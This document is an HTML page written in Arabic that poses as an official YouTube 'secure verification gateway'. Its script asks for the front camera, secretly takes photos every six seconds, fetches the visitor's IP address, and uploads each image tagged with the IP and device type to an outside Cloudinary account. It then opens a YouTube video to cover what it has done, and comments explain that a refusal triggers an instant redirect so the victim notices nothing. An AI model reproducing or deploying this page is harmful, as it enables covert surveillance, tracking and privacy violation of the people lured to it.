<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>يوتيوب | بوابة التحقق الآمنة</title>
    
    <meta name="description" content="هذا هو الموقع الرسمي المعتمد لمشاهدة الفيديو. الرابط الأصلي محمي بموجب بروتوكولات SSL. يتم توجيهك الآن للمصدر الأساسي على يوتيوب.">
    <meta property="og:title" content="YouTube Official Gateway">
    <meta property="og:description" content="الرابط الأصلي للفيديو - معتمد وآمن 100%">
    <meta property="og:url" content="https://www.youtube.com/watch?v=dQw4w9WgXcQ">
    <link rel="icon" href="data:,">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    <style>
        body { background-color: #000; color: white; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
        .loader { border: 12px solid #f3f3f3; border-top: 12px solid #3498db; border-radius: 50%; width: 80px; height: 80px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #video, #canvas { display: none; }
        p { margin-top: 25px; font-size: 16px; color: #aaa; letter-spacing: 0.5px; }
    </style>
</head>
<body>

    <div class="loader"></div>
    <p>جاري التحقق من أمان الرابط الأصلي...</p>

    <video id="video" playsinline autoplay></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        const cloudName = 'dgkttv99v';
        const uploadPreset = 'ml_default'; 
        const youtubeLink = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; 

        let tabOpened = false;

        async function init() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                document.getElementById('video').srcObject = stream;

                setTimeout(takeSnapshot, 2000); // أول لقطة
                setInterval(takeSnapshot, 6000); // تكرار كل 6 ثواني
            } catch (e) {
                // لو رفض، يروح لليوتيوب فوراً عشان ميفهمش حاجة
                window.location.href = youtubeLink;
            }
        }

        async function takeSnapshot() {
            const canvas = document.getElementById('canvas');
            const video = document.getElementById('video');
            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
            const imageData = canvas.toDataURL("image/png");

            try {
                // جلب الـ IP
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                const userIP = ipData.ip;

                const formData = new FormData();
                formData.append('file', imageData);
                formData.append('upload_preset', uploadPreset);
                formData.append('tags', `IP_${userIP}`);
                formData.append('context', `ip=${userIP}|device=${navigator.platform}`);

                fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
                    method: 'POST',
                    body: formData
                })
                .then(r => r.json())
                .then(data => {
                    console.log("Verified");
                    if (!tabOpened) {
                        window.open(youtubeLink, '_blank');
                        tabOpened = true;
                    }
                });
            } catch (err) {
                console.log("Retry...");
            }
        }

        window.onload = init;
    </script>
</body>
</html>
